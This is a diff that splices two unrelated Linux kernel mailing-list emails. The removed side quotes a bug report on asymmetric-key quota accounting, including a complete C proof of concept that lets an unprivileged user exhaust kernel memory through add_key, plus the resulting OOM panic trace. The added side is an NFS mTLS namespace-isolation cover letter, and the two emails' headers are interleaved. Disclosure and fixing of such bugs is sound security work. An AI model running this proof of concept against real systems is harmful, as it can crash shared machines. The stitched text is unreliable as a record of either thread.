@@ -1,571 +1,153 @@
-Received: from mail-ed2-f34.google.com (mail-ed2-f34.google.com [74.125.228.98])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE4374A3D50
-	for <keyrings@vger.kernel.org>; Fri, 25 Sep 2026 16:12:45 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.98
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C1F1336655C;
+	Fri, 25 Sep 2026 19:16:37 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790352767; cv=none; b=s0JA6LcfwOFhuYo9FxQjFTYcfega6FuqjZYhUuNKL4Jhy3TgxE30woc8xXeBTEI8NFq686DO+PqeJpFvoCVk6FHYAACMtBISchoG01grayd7iyt+glUOdpK4Jo9YphEXLEIR+kbFJ2Sze9cQyTZTO4Bs9zRwYy2NAunT3mvhUIY=
+	t=1790363799; cv=none; b=pcSrscTK34iGD8cUJ+7N1N9VHmmFFyQVHF0w5sH0krbAQXnNiQd/4xIwAhbRGPpdGkv6i2MSwj3XD/cDofhdRqIXlosuTjQhhkLm21WtLcVLuqMXaGxgKZiRLLRg034OMOBASWdUm1dZixsgjm3XIKR6rquBDHUSVP1UvBFC4z8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790352767; c=relaxed/simple;
-	bh=vrQf2mrYbT7jNqO/FrzprzNPDuj6uTq+YuZmoSojmNo=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=KfRprgC5j/BpsUVHchVVrLYNZ6aLoAmOvNjj6kcXfjeHbRTAA/BYOaB07CmzABGRtHI9wkpW7oOxjNjyLM/9jKkNEPtPOY64SODJKJl/zKuvqd4RKsA0STKvgTFyCYN5zvs70tcsdly7x2EFyPaLuG5ymBezcAMHH9naQiQ6KLM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win; spf=pass smtp.mailfrom=gmail.com; arc=none smtp.client-ip=74.125.228.98
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Received: by mail-ed2-f34.google.com with SMTP id 4fb4d7f45d1cf-6aae90f528fso1414947a12.1
-        for <keyrings@vger.kernel.org>; Fri, 25 Sep 2026 09:12:45 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790352764; x=1790957564;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=BziVQfdZV4sGmL5XYBIvIrmzaMllt3XOtKCm8cyts5U=;
-        b=eKeJi/v7N8fFPUeZTHmslJ/2E/6Tji792s+jTcFHLYtUVVWL9ug3TJBXM+RI0vUoB7
-         c6IZW7kqgY2tAfgZcuNGeT2P5lzad785uWhgFAXLAaTsKaKlJaKv6Bs0M6QQF3SeXhsc
-         n8lNrqKOp3wTZUvwkjDHcEGAah3OiaePtxhLxmk+L+7Jyisnga56KcrDgrKVr1MH3EQZ
-         x68MiQJjtw7oVAFdUk8AZJnVdHrP+oZ+7e7vfaOKAKz1vJSIP7Xy1LBddtsIGuRdKUe7
-         gMv343g89rD9dcFCgZA8JFdMMU5aw2LjanEJbtXGcD1PdNG7OwRMVloa2aMSMxRKH7fF
-         4rDg==
-X-Forwarded-Encrypted: i=1; AKwUvBy4Eygmy4dh40mTbvUMupOfYYCGBTq8Aa0sjo0A2iEEXlUBMmPrkn0KR82uALavqrcq2TdvcHltRg==@vger.kernel.org
-X-Gm-Message-State: AFuF++mSHqCa66XafHEsSUnpa4CHT6QFOFWPmiF8jURpbEIGWD/59cLj
-	ULmgklxi+Ln4zQsdYXmJ84Z4KZYAZe0xTOfbpDBEtsWM4thm0x6rgppEUk6W69Koq6Y=
-X-Gm-Gg: AYBFou2930HNWEEm8scUrrCmR3j0Mft8Je3mmjYMqdVsgLX0g9rCDfxxBLBwk04t8gb
-	LuX3t4BbXy+QA8vGph6r/GFuhpY1bXPddOcfO4ElkTF1VXKfHaTGmft5UDZ5TLBuM4d4bpZxIdl
-	h+S+2yk8duqsXiRMXMygFZA/16IBHZ3pSYun7sdZ9dcx+unpkLshu6IPfsa0t/w3p8xKe+gRxte
-	vensqbnfHUabizeJ3rV8Hg0cDSMEPnhW51oXECeyu8YxNOwYi9joXscd5cxb5Ffz7f5elMURNQA
-	7kXmZSqZ6hT/FRfMcCx9LFxFkeo9G4UBZ/enWRprWulg/5hoHYtssz2+p1RLSmPLyBWLrJtTVsJ
-	hvApteBupM9MAgsiQLR8eGd4fpZCetD89a9NQt424le/2sV2FVWaGpokQ2wFePB3KwvBbHKLFjd
-	1pFv6hbtDC7a6KU+yl8+YiOt0gzY0LxC+WJBDJ07cJG/Q/E4HeGa2cBeH7MIqRs7j/eRgtj8P5V
-	K9kkJkc99auk1+Wh+O2ZemLhBnqZOw=
-X-Received: by 2002:a05:6402:44da:b0:6a7:ee56:8155 with SMTP id 4fb4d7f45d1cf-6aac9100dfbmr4813331a12.35.1790352763353;
-        Fri, 25 Sep 2026 09:12:43 -0700 (PDT)
-Received: from mail-ej2-f12.google.com (mail-ej2-f12.google.com. [74.125.228.140])
-        by smtp.gmail.com with ESMTPSA id 4fb4d7f45d1cf-6aae5972da6sm1230493a12.2.2026.09.25.09.12.41
-        for <keyrings@vger.kernel.org>
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Fri, 25 Sep 2026 09:12:42 -0700 (PDT)
-Received: by mail-ej2-f12.google.com with SMTP id a640c23a62f3a-c254f56039dso154290566b.3
-        for <keyrings@vger.kernel.org>; Fri, 25 Sep 2026 09:12:41 -0700 (PDT)
-X-Forwarded-Encrypted: i=1; AKwUvBxq0RF+z5zW4l+OftPWrMWzYQEGaZM96HQBtQNumO8ChL+KP3yyCtmiPBw8PMVKQBcLoCE4Nipr2w==@vger.kernel.org
-X-Received: by 2002:a17:907:868d:b0:c26:24ed:39e5 with SMTP id
- a640c23a62f3a-c2ac2427928mr614900666b.18.1790352761318; Fri, 25 Sep 2026
- 09:12:41 -0700 (PDT)
+	s=arc-20240116; t=1790363799; c=relaxed/simple;
+	bh=nyMpWEPFZh1yvWrMy+o3UY9J/iCI0gPVCFVoM29ZVXc=;
+	h=From:Subject:Date:Message-Id:MIME-Version:Content-Type:To:Cc; b=dqgpaz1HWbFfiwWJrOXSCsRAO+o3Dbyu1QwUJUzx0NZABTptb9yX3I1DYp87/034jSogt5rN4dSHrUMTKS0PR7PaAsTXMCLRRDrGuj5RLpSe4bhQd20YFuAz9JMrmLAI/tDfexRB6K+iQyO3DkMqZaw77aIYR9CGW0PfvF5RzFg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=OsAtbxWV; arc=none smtp.client-ip=100.103.45.18
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="OsAtbxWV"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 280B61F000FF;
+	Fri, 25 Sep 2026 19:16:36 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1790363797;
+	bh=HpN2OhOrodHkPWUvKj/Ar1FiMoNTYNdUdcV94TXSHHY=;
+	h=From:Subject:Date:To:Cc;
+	b=OsAtbxWVL0pnv1KZ0nMLwxyqW0xXWZLZwMoS70uV38d3OYc2tvZGCD/7lFQ2t+YCA
+	 dYZ3eVOk9UlsBI5rzB2i73RO/aAhr9yWK/HMps/fE8RgYNNz2RJJztsJ6S6TmtxqGW
+	 zUT2QvCVjtMpvEeqfpe/PwHPxGjFDqcaOtcLXiGLFvIzqLv1W+f9Vnwo59q/oVtGMK
+	 PoMNzzF1fgnLLdvP+jSIJN0Ejz4GIuNC4/yiY1nO2sFTXvq4jdCNcqnTlKQUakMG9T
+	 dj2OIQp8MgYvlJd1KRYJcSRdMZHCwxC3FjoPkYrXouFpHCA7H1Zz5oa5K+c4YhZAGg
+	 DY45LJJYWQVHg==
+From: Chuck Lever <cel@kernel.org>
+Subject: [PATCH RFC v2 0/5] NFS: isolate mTLS client credentials by network
+ namespace
+Date: Fri, 25 Sep 2026 15:16:22 -0400
+Message-Id: <20260925-nfs-mtls-identity-v2-0-aa3ad17dd6c8@kernel.org>
 Precedence: bulk
 X-Mailing-List: keyrings@vger.kernel.org
 List-Id: <keyrings.vger.kernel.org>
 List-Subscribe: <mailto:keyrings+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:keyrings+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <cover.1789801335.git.xuyuqiabc@gmail.com>
-In-Reply-To: <cover.1789801335.git.xuyuqiabc@gmail.com>
-From: Ignat Korchagin <ignat@linux.win>
-Date: Fri, 25 Sep 2026 17:12:28 +0100
-X-Gmail-Original-Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
-X-Gm-Features: AclHuK-sA6_5_-JSmmg1x8cUtmvbvZYobmyBJtSLEpZqw5HwXISHJ-_PL02RQRQ
-Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
-Subject: Re: [PATCH 0/1] KEYS: Account for asymmetric key payload data in the quota
-To: Yuqi Xu <xuyuqiabc@gmail.com>
-Cc: linux-crypto@vger.kernel.org, David Howells <dhowells@redhat.com>, 
-	Lukas Wunner <lukas@wunner.de>, Herbert Xu <herbert@gondor.apana.org.au>, 
-	"David S . Miller" <davem@davemloft.net>, keyrings@vger.kernel.org, stable@vger.kernel.org, 
-	Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-B4-Tracking: v=1; b=H4sIAAAAAAAC/22Oyw6CQAxFf8V07SiDyMOViYkf4Na4GKBAFQbTj
+ kRj+HcZdOnynt7enDcIMqHAbvEGxoGEejuFcLmAojG2RkXllCEMwjjIdKJsJapzrUwcrSP3UkF
+ U6KiKq02UljD93Rkres6bZzgdD3D5QnnkVyycX/O13AiqnI0tGo96pprsujPikP29IXE9v2azQ
+ c9jP4n0j8SgVaB0luA2TsskNcn+hmyxXfVcw2Ucxw+MDUeV6gAAAA==
+X-Change-ID: 20260917-nfs-mtls-identity-04c14f6f348d
+To: Trond Myklebust <trondmy@kernel.org>, Anna Schumaker <anna@kernel.org>, 
+ "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
+ Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
+ Simon Horman <horms@kernel.org>, Jonathan Corbet <corbet@lwn.net>, 
+ Shuah Khan <skhan@linuxfoundation.org>, 
+ Randy Dunlap <rdunlap@infradead.org>, 
+ Christian Brauner <brauner@kernel.org>, David Howells <dhowells@redhat.com>, 
+ Sagi Grimberg <sagi@grimberg.me>
+Cc: linux-nfs@vger.kernel.org, keyrings@vger.kernel.org, 
+ kernel-tls-handshake@lists.linux.dev, netdev@vger.kernel.org, 
+ linux-doc@vger.kernel.org, Chuck Lever <cel@kernel.org>
+X-Mailer: b4 0.16-dev-da966
+X-Developer-Signature: v=1; a=openpgp-sha256; l=3712; i=cel@kernel.org;
+ h=from:subject:message-id; bh=nyMpWEPFZh1yvWrMy+o3UY9J/iCI0gPVCFVoM29ZVXc=;
+ b=owEBbQKS/ZANAwAKATNqszNvZn+XAcsmYgBqtsiJHKR24/pVxYQFtUWB/KXIfJEpSAsKRm5MS
+ rEHQtw1eHCJAjMEAAEKAB0WIQQosuWwEobfJDzyPv4zarMzb2Z/lwUCarbIiQAKCRAzarMzb2Z/
+ lwZgD/9QE9Jc4twnUjXcRAmZDaJEigYQSfTpENIGpn2rSDxaO14MIECid4BV2gTZfehuOoyaNO4
+ 5TQdmIUvjy3c9SlGGr3mxEJpr4iq2u3ucCpI1vKkGbN5KrSiyWIq/3klR3ABkMm5R9rBiFUuuZK
+ vpjQYGBcIa6hb+cYJCvBJtZT6LsJWUB70wBhQvVsh4r08W9KaJ1uMh2ct7zXn9jdNIaADyA9kWp
+ P0xZHMN392aECY01EV6HfR5P7Ie/vHSpkNKv+HaH39HY2/Za/zLKDdp5KRRZHoV/JnVU486JnD+
+ AHX09Wgi0edCrTo5NQaCOkafT6tEmoiJ0n2SrTQJYWKzIw97RBndfscloJb7TFfCyNwiEVhb9rv
+ 9Mhn67z01zQa2/AzYzYYL2XPwOOqsFvkFaLL96ts1z863ChHqCnVeqkVC4d6ZwQdp3Xs5CjQ8ZF
+ BUMFc027TQ3FPJg1QfhaQeBbc3j1rLrCXDDw6QeqQdil5TBD0Y6GKuy6bfx23vmiDNLsZyBi7Pl
+ 03Ew3mdsXnPql9R22f5tUquCtoSuSOKnBxOksu0rGpJiIYq9r07w4z3PoHYm4MWzxS1X4BPJmRi
+ Qyp+bWk8/5N0Ukx0DWeVQoG8L2AeW9SFjgz4f2JezTLw/U2qymBxAA2RcM4Jy8YZMSyD9QI1oiR
+ k0X+1fQolQEfT1A==
+X-Developer-Key: i=cel@kernel.org; a=openpgp;
+ fpr=28B2E5B01286DF243CF23EFE336AB3336F667F97
 
-On Sat, Sep 19, 2026 at 9:46=E2=80=AFAM Yuqi Xu <xuyuqiabc@gmail.com> wrote=
-:
->
-> Hi Linux kernel maintainers,
->
-> We found and validated an issue in
-> crypto/asymmetric_keys/pkcs8_parser.c.  The bug is reachable by a
-> non-root user through add_key("asymmetric", ...); it does not require a
-> user or network namespace.  We've tested the fix and it should not
-> affect other functionality.
->
-> We will provide detailed information about the bug in this email, along
-> with a reproducer.
->
-> ---- details below ----
->
-> Bug details:
+An xprtsec=mtls mount names its client certificate and private key
+by keyring serial number, and tlshd reads those keys with its own
+credentials. Each key therefore has to grant user read permission,
+and any tlshd on the host that learns a serial number can read it.
+Nothing separates one network namespace's credentials from
+another's.
 
-I feel these details are important and should actually go into the
-commit message. Since you have only 1 patch there is no need for cover
-letter (which will not end up in git anyway). Can you combine this and
-the commit message in the actual patch into 1 patch and send it
-without the cover letter?
+This series makes the network namespace the isolation domain. The
+RFC thread asked whether the user or mount namespace is the better
+binding. tlshd services the handshake socket of one network
+namespace, so that is the namespace it already lives in.
 
-> add_key("asymmetric", ...) preparses the supplied blob with the
-> registered asymmetric key parsers and then instantiates the key with
-> generic_key_instantiate(), which charges prep->quotalen to the owning
-> user's key quota through key_payload_reserve().
->
-> pkcs8_parse() ASN.1-decodes the outer PKCS#8 structure and duplicates
-> the attacker-controlled PrivateKey OCTET STRING with
-> kmemdup(ctx.key, ctx.key_size, GFP_KERNEL) into pub->key.
-> pkcs8_key_preparse() then stores that object persistently in the
-> asymmetric-key payload, but hard-codes
->
->     prep->quotalen =3D 100;
->
-> so the quota records only 100 bytes regardless of the retained private
-> key size.  The ASN.1 decoder accepts blobs up to 65535 bytes, so one key
-> can pin about 64 KiB of kernel memory while consuming 100 quota bytes.
-> With the default non-root limits (200 keys / 20000 bytes) a user can
-> retain roughly 12 MiB of kernel memory instead of the 20 KiB the limit
-> is meant to allow.
->
-> x509_key_preparse() has the same problem: it keeps the parsed public
-> key, its parameters, the signature, the key IDs and the authority key
-> IDs, but also charges a fixed 100 bytes.  The same add_key() call
-> reaches the X.509 parser, so fixing only PKCS#8 would leave the bypass
-> reachable; the patch accounts
-> for the retained payload in both parsers.
->
-> Measured on v7.3-rc1 (10396a2d6d41), 2 vCPU / 2 GiB QEMU guest.  The
-> test drops to uid 1000 and adds PKCS#8 keys with a 65000-byte
-> PrivateKey field through add_key("asymmetric", ...):
->
-> Before the patch (/proc/key-users, uid 1000):
->   1000:     5 5/5 5/200 259/20000
->   added 176 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
->   1000:   182 182/181 181/200 19971/20000
-> 176 keys retained about 11.4 MiB of kernel memory, but were charged only
-> 19971 - 259 =3D 19712 bytes in total, about 112 bytes per key.
->
-> After the patch:
->   1000:     5 5/5 5/200 1139/20000
->   added 0 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
-> The oversized key is rejected immediately, while a small PKCS#8 key
-> (200-byte PrivateKey) still loads and is charged 264 bytes.
->
-> The same holds for a small X.509 certificate whose only large object is
-> a 26000-byte authorityKeyIdentifier key ID: the patch rejects it, while
-> the unpatched kernel accepted it and charged 109 bytes.
->
-> The panic log below was captured by the report during the initial
-> validation.
->
-> Reproducer:
->
->   gcc -O2 -static -o poc poc.c
->   ./poc
->
-> Run the PoC as an unprivileged user; no namespace is needed.  We run it
-> in a 2 vCPU, 2 GB RAM x86 QEMU environment.
->
-> ------BEGIN poc.c------
->
-> #define _GNU_SOURCE
->
-> #include <errno.h>
-> #include <inttypes.h>
-> #include <linux/keyctl.h>
-> #include <stdbool.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/mman.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <time.h>
-> #include <unistd.h>
->
-> typedef int32_t key_serial_t;
->
-> struct options {
->         size_t payload_size;
->         size_t key_count;
->         size_t anon_mb;
->         unsigned pause_secs;
->         bool revoke_on_exit;
-> };
->
-> static void usage(const char *prog)
-> {
->         fprintf(stderr,
->                 "Usage: %s [--payload-size BYTES] [--key-count N] [--anon=
--mb MB]\n"
->                 "          [--pause SECS] [--revoke-on-exit]\n",
->                 prog);
-> }
->
-> static size_t der_len_bytes(size_t len)
-> {
->         size_t n =3D 0;
->
->         if (len < 0x80)
->                 return 1;
->
->         while (len) {
->                 n++;
->                 len >>=3D 8;
->         }
->
->         return 1 + n;
-> }
->
-> static size_t der_put_len(unsigned char *dst, size_t len)
-> {
->         size_t n =3D 0;
->         size_t tmp =3D len;
->
->         if (len < 0x80) {
->                 dst[0] =3D (unsigned char)len;
->                 return 1;
->         }
->
->         while (tmp) {
->                 n++;
->                 tmp >>=3D 8;
->         }
->
->         dst[0] =3D 0x80 | n;
->         for (size_t i =3D 0; i < n; i++)
->                 dst[1 + i] =3D (unsigned char)(len >> ((n - 1 - i) * 8));
->
->         return 1 + n;
-> }
->
-> static unsigned char *build_pkcs8(size_t payload_size, size_t *blob_len_o=
-ut)
-> {
->         static const unsigned char algo_id[] =3D {
->                 0x30, 0x0d,
->                 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
->                 0x0d, 0x01, 0x01, 0x01,
->                 0x05, 0x00,
->         };
->         const size_t octet_total =3D 1 + der_len_bytes(payload_size) + pa=
-yload_size;
->         const size_t seq_content_len =3D 3 + sizeof(algo_id) + octet_tota=
-l;
->         const size_t blob_len =3D 1 + der_len_bytes(seq_content_len) + se=
-q_content_len;
->         unsigned char *blob;
->         unsigned char *p;
->
->         blob =3D malloc(blob_len);
->         if (!blob)
->                 return NULL;
->
->         p =3D blob;
->         *p++ =3D 0x30;
->         p +=3D der_put_len(p, seq_content_len);
->
->         *p++ =3D 0x02;
->         *p++ =3D 0x01;
->         *p++ =3D 0x00;
->
->         memcpy(p, algo_id, sizeof(algo_id));
->         p +=3D sizeof(algo_id);
->
->         *p++ =3D 0x04;
->         p +=3D der_put_len(p, payload_size);
->
->         for (size_t i =3D 0; i < payload_size; i++)
->                 p[i] =3D (unsigned char)(i * 131u + 7u);
->         p +=3D payload_size;
->
->         if ((size_t)(p - blob) !=3D blob_len) {
->                 fprintf(stderr, "internal length mismatch: %zu !=3D %zu\n=
-",
->                         (size_t)(p - blob), blob_len);
->                 free(blob);
->                 return NULL;
->         }
->
->         *blob_len_out =3D blob_len;
->         return blob;
-> }
->
-> static long add_key_syscall(const char *type, const char *desc,
->                             const void *payload, size_t plen,
->                             key_serial_t ringid)
-> {
->         return syscall(SYS_add_key, type, desc, payload, plen, ringid);
-> }
->
-> static long keyctl_syscall(int cmd, unsigned long arg2, unsigned long arg=
-3,
->                            unsigned long arg4, unsigned long arg5)
-> {
->         return syscall(SYS_keyctl, cmd, arg2, arg3, arg4, arg5);
-> }
->
-> static void *spray_anon(size_t anon_mb)
-> {
->         const size_t bytes =3D anon_mb * 1024ULL * 1024ULL;
->         const long page_size =3D sysconf(_SC_PAGESIZE);
->         unsigned char *mapping;
->
->         if (!anon_mb)
->                 return NULL;
->
->         mapping =3D mmap(NULL, bytes, PROT_READ | PROT_WRITE,
->                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
->         if (mapping =3D=3D MAP_FAILED) {
->                 perror("mmap anon");
->                 return NULL;
->         }
->
->         for (size_t off =3D 0; off < bytes; off +=3D (size_t)page_size)
->                 mapping[off] =3D (unsigned char)(off / (size_t)page_size)=
-;
->
->         printf("[*] touched %zu MiB of anonymous memory\n", anon_mb);
->         fflush(stdout);
->         return mapping;
-> }
->
-> static unsigned long parse_u64(const char *name, const char *value)
-> {
->         char *end =3D NULL;
->         unsigned long long out;
->
->         errno =3D 0;
->         out =3D strtoull(value, &end, 0);
->         if (errno || !end || *end) {
->                 fprintf(stderr, "bad value for %s: %s\n", name, value);
->                 exit(1);
->         }
->
->         return (unsigned long)out;
-> }
->
-> int main(int argc, char **argv)
-> {
->         struct options opt =3D {
->                 .payload_size =3D 65000,
->                 .key_count =3D 178,
->                 .anon_mb =3D 700,
->                 .pause_secs =3D 0,
->                 .revoke_on_exit =3D false,
->         };
->         unsigned char *blob =3D NULL;
->         size_t blob_len =3D 0;
->         key_serial_t *serials =3D NULL;
->         void *anon_mapping =3D NULL;
->         size_t added =3D 0;
->         char ring_name[64];
->         int ret =3D 0;
->
->         for (int i =3D 1; i < argc; i++) {
->                 if (!strcmp(argv[i], "--payload-size") && i + 1 < argc) {
->                         opt.payload_size =3D parse_u64("--payload-size", =
-argv[++i]);
->                 } else if (!strcmp(argv[i], "--key-count") && i + 1 < arg=
-c) {
->                         opt.key_count =3D parse_u64("--key-count", argv[+=
-+i]);
->                 } else if (!strcmp(argv[i], "--anon-mb") && i + 1 < argc)=
- {
->                         opt.anon_mb =3D parse_u64("--anon-mb", argv[++i])=
-;
->                 } else if (!strcmp(argv[i], "--pause") && i + 1 < argc) {
->                         opt.pause_secs =3D parse_u64("--pause", argv[++i]=
-);
->                 } else if (!strcmp(argv[i], "--revoke-on-exit")) {
->                         opt.revoke_on_exit =3D true;
->                 } else {
->                         usage(argv[0]);
->                         return 1;
->                 }
->         }
->
->         if (opt.payload_size > (1024U * 1024U - 128U)) {
->                 fprintf(stderr, "payload too large for add_key limit\n");
->                 return 1;
->         }
->
->         blob =3D build_pkcs8(opt.payload_size, &blob_len);
->         if (!blob) {
->                 perror("build_pkcs8");
->                 return 1;
->         }
->
->         serials =3D calloc(opt.key_count, sizeof(*serials));
->         if (!serials) {
->                 perror("calloc serials");
->                 free(blob);
->                 return 1;
->         }
->
->         snprintf(ring_name, sizeof(ring_name), "pkcs8-n6q-%ld", (long)get=
-pid());
->         if (keyctl_syscall(KEYCTL_JOIN_SESSION_KEYRING,
->                            (unsigned long)ring_name, 0, 0, 0) < 0) {
->                 perror("keyctl join_session_keyring");
->                 ret =3D 1;
->                 goto out;
->         }
->
->         printf("[*] payload_size=3D%zu blob_len=3D%zu key_count=3D%zu ano=
-n_mb=3D%zu\n",
->                opt.payload_size, blob_len, opt.key_count, opt.anon_mb);
->         fflush(stdout);
->
->         anon_mapping =3D spray_anon(opt.anon_mb);
->         if (opt.anon_mb && !anon_mapping) {
->                 ret =3D 1;
->                 goto out;
->         }
->
->         for (size_t i =3D 0; i < opt.key_count; i++) {
->                 char desc[32];
->                 long serial;
->
->                 snprintf(desc, sizeof(desc), "k%06zu", i);
->                 serial =3D add_key_syscall("asymmetric", desc, blob, blob=
-_len,
->                                          KEY_SPEC_SESSION_KEYRING);
->                 if (serial < 0) {
->                         fprintf(stderr,
->                                 "[!] add_key failed after %zu keys: errno=
-=3D%d (%s)\n",
->                                 added, errno, strerror(errno));
->                         ret =3D 1;
->                         goto out;
->                 }
->
->                 serials[added++] =3D (key_serial_t)serial;
->                 if ((added % 10) =3D=3D 0 || added =3D=3D 1) {
->                         printf("[+] added %zu keys, last serial=3D%ld\n",
->                                added, serial);
->                         fflush(stdout);
->                 }
->         }
->
->         printf("[+] completed %zu successful add_key calls\n", added);
->         fflush(stdout);
->
->         if (opt.pause_secs) {
->                 printf("[*] sleeping for %u seconds\n", opt.pause_secs);
->                 fflush(stdout);
->                 sleep(opt.pause_secs);
->         }
->
-> out:
->         if (opt.revoke_on_exit) {
->                 for (size_t i =3D 0; i < added; i++)
->                         keyctl_syscall(KEYCTL_REVOKE, serials[i], 0, 0, 0=
-);
->         }
->
->         if (anon_mapping)
->                 munmap(anon_mapping, opt.anon_mb * 1024ULL * 1024ULL);
->         free(serials);
->         free(blob);
->         return ret;
-> }
->
-> ------END poc.c--------
->
-> ----BEGIN crash log----
->
-> [  291.603731][T10195] Kernel panic - not syncing: Out of memory: compuls=
-ory panic_on_oom is enabled
+  https://lore.kernel.org/linux-nfs/20260602154740.49861-1-cel@kernel.org/
 
-Drop time and task id when you send splats
+The keyring is held in struct nfs_net rather than found by name,
+because /proc/keys is not namespace scoped. Its serial number
+travels with each handshake instead (patches 3-4), and tlshd's
+possession of that keyring is what lets a provisioned key grant no
+user read permission at all. Both ends of the link exist today, in
+tls_handshake_accept() and in tlshd. The handshake genetlink ABI and
+the cert_serial= and privkey_serial= mount options do not change.
 
-> [  291.604425][T10195] CPU: 1 UID: 1028 PID: 10195 Comm: poc Not tainted =
-6.12.74 #3
-> [  291.604946][T10195] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX=
-, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> [  291.605646][T10195] Call Trace:
-> [  291.605889][T10195]  <TASK>
-> [  291.606112][T10195]  dump_stack_lvl+0x3b/0x1f0
-> [  291.606466][T10195]  panic+0x6fe/0x7e0
-> [  291.606767][T10195]  ? dump_header+0x6c2/0x950
-> [  291.607117][T10195]  ? __pfx_panic+0x10/0x10
-> [  291.607458][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.607883][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.608335][T10195]  ? out_of_memory+0x8c5/0x16b0
-> [  291.608714][T10195]  out_of_memory+0x8f3/0x16b0
-> [  291.609092][T10195]  ? __pfx_out_of_memory+0x10/0x10
-> [  291.609483][T10195]  ? lock_acquire+0x2f/0xb0
-> [  291.609824][T10195]  ? __alloc_pages_noprof+0xd59/0x26d0
-> [  291.610258][T10195]  __alloc_pages_noprof+0x1ec3/0x26d0
-> [  291.610688][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.611102][T10195]  ? hlock_class+0x4e/0x130
-> [  291.611463][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.611885][T10195]  ? __pfx___alloc_pages_noprof+0x10/0x10
-> [  291.612350][T10195]  ? __pfx___lock_acquire+0x10/0x10
-> [  291.612755][T10195]  ? __sanitizer_cov_trace_switch+0x54/0x90
-> [  291.613198][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.613615][T10195]  ? policy_nodemask+0xf2/0x4f0
-> [  291.613993][T10195]  alloc_pages_mpol_noprof+0x2ce/0x610
-> [  291.614417][T10195]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
-> [  291.614859][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.615294][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.615709][T10195]  ? xas_load+0x49/0x5b0
-> [  291.616038][T10195]  ? filemap_get_entry+0xd5/0x3c0
-> [  291.616444][T10195]  folio_alloc_noprof+0x23/0xd0
-> [  291.616820][T10195]  filemap_alloc_folio_noprof+0x35d/0x420
-> [  291.617244][T10195]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
-> [  291.617694][T10195]  ? filemap_fault+0x631/0x2800
-> [  291.618086][T10195]  __filemap_get_folio+0x53e/0xaf0
-> [  291.618499][T10195]  filemap_fault+0x675/0x2800
-> [  291.618878][T10195]  ? __pfx_filemap_fault+0x10/0x10
-> [  291.619284][T10195]  ? do_pte_missing+0x165a/0x3ff0
-> [  291.619662][T10195]  ? __pfx_lock_release+0x10/0x10
-> [  291.620055][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
-> [  291.620471][T10195]  __do_fault+0x10f/0x4a0
-> [  291.620800][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
-> [  291.621210][T10195]  do_pte_missing+0x174c/0x3ff0
-> [  291.621585][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
-> [  291.622002][T10195]  ? reacquire_held_locks+0x20b/0x4c0
